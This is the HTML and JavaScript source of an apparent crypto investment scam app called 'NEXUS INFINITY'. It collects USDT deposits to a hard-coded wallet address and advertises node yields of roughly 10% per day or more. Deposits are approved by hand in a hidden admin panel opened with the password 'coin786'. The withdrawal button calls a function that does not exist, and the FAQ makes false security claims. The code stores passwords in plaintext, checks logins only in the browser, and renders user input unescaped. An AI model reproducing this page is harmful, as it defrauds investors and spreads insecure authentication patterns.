<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --neon-red: #ff003c; --neon-pink: #ff00ff; --black: #050505; --glass: rgba(15, 15, 15, 0.96); }
        body { background: var(--black); color: white; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* Premium Background System */
        #auth-section { 
            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.9)), url('https://images.unsplash.com/photo-1640341719941-48398cb91ce1?q=80&w=2070&auto=format&fit=crop'); 
            background-size: cover; background-position: center; background-attachment: fixed;
        }

        #splash { transition: opacity 0.8s ease, visibility 0.8s; }
        .splash-logo { background: linear-gradient(to tr, var(--neon-red), var(--neon-pink)); box-shadow: 0 0 60px rgba(255, 0, 60, 0.6); animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.15); opacity: 0.8; } }

        .glass-panel { background: var(--glass); backdrop-filter: blur(50px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 35px; }
        .btn-master { background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); color: white; font-weight: 800; padding: 18px; border-radius: 20px; width: 100%; border: none; cursor: pointer; box-shadow: 0 10px 30px rgba(255, 0, 60, 0.4); text-transform: uppercase; letter-spacing: 1px; }
        .input-dark { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 18px; color: white; width: 100%; outline: none; transition: 0.3s; }
        .input-dark:focus { border-color: var(--neon-red); box-shadow: 0 0 15px rgba(255, 0, 60, 0.2); }
        .nav-item { color: #444; text-align: center; cursor: pointer; font-size: 9px; font-weight: 800; transition: 0.3s; }
        .nav-item.active { color: var(--neon-red); text-shadow: 0 0 12px var(--neon-red); }
        .hidden { display: none !important; }
        .node-card { transition: 0.4s; border: 1px solid rgba(255,255,255,0.03); }
        .node-card:hover { transform: translateY(-5px); border-color: var(--neon-red); }
    </style>
</head>
<body>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-28 h-28 splash-logo rounded-[2.8rem] flex items-center justify-center text-6xl font-black text-white">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-10 text-sm tracking-[0.5em] text-white">NEXUS<span class="text-[#ff003c]">INFINITY</span></h1>
        <p class="text-[8px] text-zinc-500 mt-6 font-black uppercase tracking-[0.3em] animate-pulse">Establishing Crypto Tunnel...</p>
    </div>

    <div id="auth-section" class="min-h-screen p-8 flex flex-col justify-center hidden">
        <div class="max-w-sm mx-auto w-full space-y-12">
            <div id="logo-tap" class="text-center">
                <div class="w-24 h-24 bg-gradient-to-tr from-zinc-900 to-black mx-auto rounded-[2.2rem] flex items-center justify-center text-5xl font-black border border-white/10 shadow-2xl">N</div>
                <h2 style="font-family: 'Syncopate'" class="mt-8 text-2xl tracking-tighter">NEXUS<span class="text-[#ff003c]">INFINITY</span></h2>
                <p class="text-[9px] text-zinc-400 mt-2 font-bold uppercase tracking-[0.2em]">Institutional Access Hub</p>
            </div>
            
            <div id="login-ui" class="space-y-4 p-8 glass-panel border border-white/10 shadow-2xl">
                <input type="text" id="l-user" placeholder="Account ID" class="input-dark">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-dark">
                <button onclick="handleLogin()" class="btn-master">Authorize Connection</button>
                <div class="flex justify-between px-2 pt-2">
                    <p onclick="toggleAuth(true)" class="text-[9px] text-zinc-400 font-black uppercase cursor-pointer hover:text-white transition">Register ID</p>
                    <p class="text-[9px] text-zinc-600 font-black uppercase cursor-not-allowed">Forgot Key?</p>
                </div>
            </div>

            <div id="signup-ui" class="space-y-4 p-8 glass-panel border border-white/10 hidden">
                <input type="text" id="s-user" placeholder="Create Unique ID" class="input-dark">
                <input type="password" id="s-pass" placeholder="Create Security Key" class="input-dark">
                <button onclick="handleSignup()" class="btn-master">Initialize Identity</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-400 font-black uppercase cursor-pointer pt-4">Return to login</p>
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-32">
        <nav class="p-6 sticky top-0 bg-black/80 backdrop-blur-3xl z-[500] border-b border-white/5 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center font-black border border-white/10">N</div>
                <div class="flex flex-col">
                    <span id="nav-user" class="text-sm font-black italic text-[#ff003c] leading-none uppercase">...</span>
                    <span class="text-[8px] text-green-500 font-black uppercase mt-1 animate-pulse">Online</span>
                </div>
            </div>
            <button onclick="logout()" class="w-10 h-10 rounded-full bg-zinc-900/50 flex items-center justify-center border border-white/5"><i class="fa-solid fa-power-off text-zinc-600"></i></button>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="glass-panel p-8 bg-gradient-to-br from-zinc-900 via-zinc-950 to-black relative overflow-hidden border border-white/10">
                <div class="relative z-10">
                    <p class="text-[9px] font-black text-zinc-500 uppercase tracking-widest mb-2">Institutional Net Equity</p>
                    <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter text-white">$0.00</h2>
                    <div class="mt-8 flex justify-between border-t border-white/5 pt-6">
                        <div><p class="text-[7px] text-zinc-500 uppercase mb-1">Yield Accumulation</p><p id="profit-txt" class="text-xl font-black text-[#ff00ff]">+$0.00</p></div>
                        <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase mb-1">Network Stability</p><p class="text-[9px] font-black text-blue-500 animate-pulse">OPTIMIZED</p></div>
                    </div>
                </div>
            </div>
            
            <div class="flex justify-between items-center px-1">
                <h3 class="text-[10px] font-black text-zinc-600 uppercase tracking-widest">Available Nodes</h3>
                <span class="text-[8px] bg-[#ff003c]/20 text-[#ff003c] px-2 py-1 rounded-full font-bold">LIVE FEED</span>
            </div>
            <div id="nodes-market" class="grid gap-4"></div>
        </div>

        <div id="page-finance" class="p-6 space-y-8 hidden">
            <div class="glass-panel p-7 space-y-6 border border-white/5">
                <h3 class="text-lg font-black italic text-[#ff003c] uppercase">Capital Injection</h3>
                <div class="bg-black/60 p-5 rounded-2xl border border-white/5">
                    <p class="text-[7px] text-zinc-500 font-black mb-1 uppercase tracking-widest">USDT TRC20 / Binance Pay</p>
                    <div class="flex items-center justify-between">
                        <p class="text-[11px] font-black text-white break-all pr-4">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                        <i class="fa-solid fa-copy text-[#ff00ff]" onclick="alert('Address Copied!')"></i>
                    </div>
                </div>
                <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="input-dark">
                <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-dark">
                <div>
                    <p class="text-[9px] text-zinc-500 mb-3 font-bold uppercase">Screen Shot / Proof Image:</p>
                    <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-zinc-500 block w-full file:mr-4 file:py-2.5 file:px-6 file:rounded-full file:bg-zinc-800 file:text-white file:border-0 file:font-black">
                    <img id="preview-img" class="mt-4 w-full rounded-2xl border border-white/10 hidden">
                </div>
                <button onclick="submitDep()" class="btn-master">Initialize Injection</button>
            </div>

            <div class="glass-panel p-7 space-y-6 border border-white/5">
                <h3 class="text-lg font-black italic uppercase">Capital Payout</h3>
                <select id="w-method" class="input-dark bg-zinc-900">
                    <option value="Binance Pay">Binance Pay (ID)</option>
                    <option value="Trust Wallet">Trust Wallet (TRC20)</option>
                    <option value="OKX">OKX Exchange</option>
                    <option value="Bybit">Bybit Network</option>
                    <option value="KuCoin">KuCoin Node</option>
                    <option value="Kraken">Kraken Terminal</option>
                    <option value="Coinbase">Coinbase Wallet</option>
                </select>
                <input type="number" id="w-amt" placeholder="Amount to Withdraw ($)" class="input-dark">
                <input type="text" id="w-addr" placeholder="Wallet Address / Method ID" class="input-dark">
                <button onclick="submitWith()" class="btn-master !bg-zinc-800">Process Payout</button>
            </div>
        </div>

        <div id="page-history" class="p-6 space-y-6 hidden">
            <h3 class="text-xl font-black italic uppercase">Terminal History</h3>
            <div id="history-list" class="space-y-4"></div>
        </div>

        <div id="page-trust" class="p-6 space-y-6 hidden">
            <div class="glass-panel p-6 space-y-4">
                <h3 class="text-[10px] font-black text-[#ff003c] uppercase tracking-widest">Global FAQ</h3>
                <details class="bg-black/40 p-4 rounded-2xl border border-white/5"><summary class="text-[11px] font-black uppercase">Is my capital secure?</summary><p class="text-[10px] text-zinc-500 mt-2">All funds are locked in decentralized cold-storage nodes with end-to-end institutional encryption.</p></details>
                <details class="bg-black/40 p-4 rounded-2xl border border-white/5"><summary class="text-[11px] font-black uppercase">How to add more nodes?</summary><p class="text-[10px] text-zinc-500 mt-2">Simply deposit funds into your Vault and select "Deploy" on any available node in the CORE market.</p></details>
            </div>
            <div class="space-y-2">
                <div onclick="alert('PRIVACY:\nNo data is shared with third parties. Terminal IDs are anonymized.')" class="glass-panel p-6 flex justify-between items-center text-[11px] font-black"><span>PRIVACY POLICY</span><i class="fa-solid fa-chevron-right opacity-30"></i></div>
                <div onclick="alert('TERMS:\nMinimum withdrawal: $5. Minimum deposit: $10. Referral bonus: 10%.')" class="glass-panel p-6 flex justify-between items-center text-[11px] font-black"><span>TERMS OF SERVICE</span><i class="fa-solid fa-chevron-right opacity-30"></i></div>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-black/80 backdrop-blur-3xl border-t border-white/5 p-6 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-gauge-high text-xl mb-1"></i><p>CORE</p></div>
            <div onclick="switchPage('finance')" class="nav-item"><i class="fa-solid fa-wallet text-xl mb-1"></i><p>VAULT</p></div>
            <div onclick="switchPage('history')" class="nav-item"><i class="fa-solid fa-clock-rotate-left text-xl mb-1"></i><p>LOGS</p></div>
            <div onclick="switchPage('trust')" class="nav-item"><i class="fa-solid fa-shield-check text-xl mb-1"></i><p>TRUST</p></div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[9999] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="text-xl font-black italic text-[#ff003c]">ADMIN OVERRIDE</h2><button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button></div>
        <div id="admin-dep-list" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Unlimited Nodes Configuration (10+5)
        const nodesArr = [
            ...Array.from({length: 10}, (_, i) => ({ id: i+1, type: 'Standard', title: `Node-S${i+1}`, price: (i+1)*15, daily: ((i+1)*1.5).toFixed(2), days: 30 })),
            ...Array.from({length: 5}, (_, i) => ({ id: i+11, type: 'Apex Elite', title: `Apex-Elite-0${i+1}`, price: (i+1)*400, daily: ((i+1)*55).toFixed(2), days: 45 }))
        ];

        window.onload = () => {
            renderNodes();
            setTimeout(() => {
                document.getElementById('splash').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('splash').classList.add('hidden');
                    const user = localStorage.getItem('nexus_user');
                    if(user) showDashboard(user);
                    else document.getElementById('auth-section').classList.remove('hidden');
                }, 800);
            }, 3000);
        };

        function renderNodes() {
            document.getElementById('nodes-market').innerHTML = nodesArr.map(n => `
                <div class="glass-panel p-6 flex justify-between items-center node-card ${n.type.includes('Apex') ? 'border-[#ff003c]' : ''}">
                    <div><p class="text-[7px] font-black ${n.type.includes('Apex') ? 'text-[#ff003c]' : 'text-zinc-500'} uppercase mb-1">${n.type}</p><h4 class="text-xl font-black italic">${n.title}</h4><p class="text-[9px] font-black text-green-500">+$${n.daily}/Day</p></div>
                    <div class="text-right"><p class="text-lg font-black">$${n.price}</p><button onclick="buyNode(${n.id})" class="bg-white text-black px-5 py-2 rounded-xl text-[9px] font-black mt-1 uppercase">Deploy</button></div>
                </div>`).join('');
        }

        // Image Handling (Base64)
        document.getElementById('dep-proof').onchange = (e) => {
            const reader = new FileReader();
            reader.readAsDataURL(e.target.files[0]);
            reader.onload = () => { 
                document.getElementById('preview-img').src = reader.result;
                document.getElementById('preview-img').classList.remove('hidden');
            };
        };

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Missing Protocol Data!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, proof, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry);
            await set(ref(db, `admin/deposits/${hRef.key}`), entry);
            alert("Deposit Logged!");
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toLocaleString();
                if(d.history) {
                    const logs = Object.entries(d.history).reverse();
                    document.getElementById('history-list').innerHTML = logs.map(([k, l]) => `
                        <div class="glass-panel p-5 flex justify-between items-center border-l-4 ${l.status === 'pending' ? 'border-yellow-500' : 'border-green-500'}">
                            <div><p class="text-[10px] font-black uppercase">${l.type}</p><p class="text-[7px] text-zinc-500">${l.date}</p></div>
                            <div class="text-right"><p class="text-sm font-black">$${l.amount}</p><span class="text-[8px] font-black uppercase ${l.status==='pending'?'text-yellow-500':'text-green-500'}">${l.status}</span></div>
                        </div>`).join('');
                }
            });
        }

        // Admin Secret Trigger (4 Taps)
        let taps = 0; document.getElementById('admin-trigger').onclick = document.getElementById('logo-tap').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Access Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; }
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/deposits'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-dep-list').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass-panel p-6 space-y-4">
                        <p class="text-xs">User: <span class="text-[#ff003c]">${l.user}</span> | Amt: <span class="text-green-500">$${l.amount}</span></p>
                        <p class="text-[9px] text-zinc-500">TID: ${l.tid}</p>
                        <img src="${l.proof}" class="w-full rounded-xl border border-white/10" onclick="window.open(this.src)">
                        <button onclick="approveDep('${id}','${l.user}',${l.amount},'${l.hKey}')" class="w-full bg-green-600 py-4 rounded-2xl text-[11px] font-black uppercase">Approve Capital</button>
                    </div>`).join('') : '<p class="text-center text-xs opacity-30 uppercase tracking-widest">No protocol pending</p>';
            });
        }

        window.approveDep = async (aKey, u, a, hKey) => {
            const snap = await get(ref(db, `users/${u}`));
            await update(ref(db, `users/${u}`), { balance: (snap.val().balance || 0) + parseFloat(a) });
            await update(ref(db, `users/${u}/history/${hKey}`), { status: 'Approved' });
            await remove(ref(db, `admin/deposits/${aKey}`));
            alert("Capital Authorized!");
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim();
            const p = document.getElementById('s-pass').value.trim();
            if(!u || !p) return alert("Input Error!");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 });
            alert("ID Initialized!"); toggleAuth(false);
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); }
            else alert("Denial of Authorization!");
        };

        window.switchPage = (p) => {
            ['home', 'finance', 'history', 'trust'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            if(event) event.currentTarget.classList.add('active');
        };
        window.toggleAuth = (s) => {
            document.getElementById('login-ui').classList.toggle('hidden', s);
            document.getElementById('signup-ui').classList.toggle('hidden', !s);
        };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
